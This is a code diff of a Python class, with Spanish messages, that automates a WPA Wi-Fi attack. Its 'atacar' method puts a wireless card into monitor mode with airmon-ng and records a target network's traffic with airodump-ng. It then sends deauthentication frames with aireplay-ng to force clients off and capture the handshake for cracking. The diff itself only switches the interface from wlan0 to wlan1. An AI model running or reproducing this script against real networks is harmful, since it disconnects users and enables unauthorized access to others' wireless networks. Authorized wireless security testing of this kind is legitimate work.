@@ -16,17 +16,17 @@ class Wpa():
 	
 	def atacar(self):
 		wlan = commands.getoutput('sudo airmon-ng check kill')
-		comando = 'sudo airmon-ng start wlan0 '+self.red().channel()
+		comando = 'sudo airmon-ng start wlan1 '+self.red().channel()
 		wlan = commands.getoutput(comando)
 		nom = self.red().bssid()
 		nom = nom.replace(" ","_")
 		archivo = './datos/'+nom+'/'+nom
 		print('Empezando la busqueda de handshakes')
-		comando ='sudo airodump-ng --bssid '+str(self.red().essid())+' --channel '+str(self.red().channel())+' --write '+archivo+' wlan0mon'
+		comando ='sudo airodump-ng --bssid '+str(self.red().essid())+' --channel '+str(self.red().channel())+' --write '+archivo+' wlan1mon'
 		airodump = subprocess.Popen(comando,shell=True,preexec_fn=os.setsid)
 		time.sleep(2)
 		print('lanzando la desautenticacion')
-		comando = 'sudo aireplay-ng -0 15 -a '+self.red().essid()+' wlan0mon'
+		comando = 'sudo aireplay-ng -0 15 -a '+self.red().essid()+' wlan1mon'
 		aireplay = subprocess.Popen([comando],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
 		aireplay.wait()
 		print('Capturando handshake')
@@ -55,5 +55,5 @@ class Wpa():
 
 
 	def habilitarWlan(self):
-		wlan = commands.getoutput('sudo airmon-ng stop wlan0mon')
-		wlan = commands.getoutput('sudo ifconfig wlan0 up')
+		wlan = commands.getoutput('sudo airmon-ng stop wlan1mon')
+		wlan = commands.getoutput('sudo ifconfig wlan1 up')
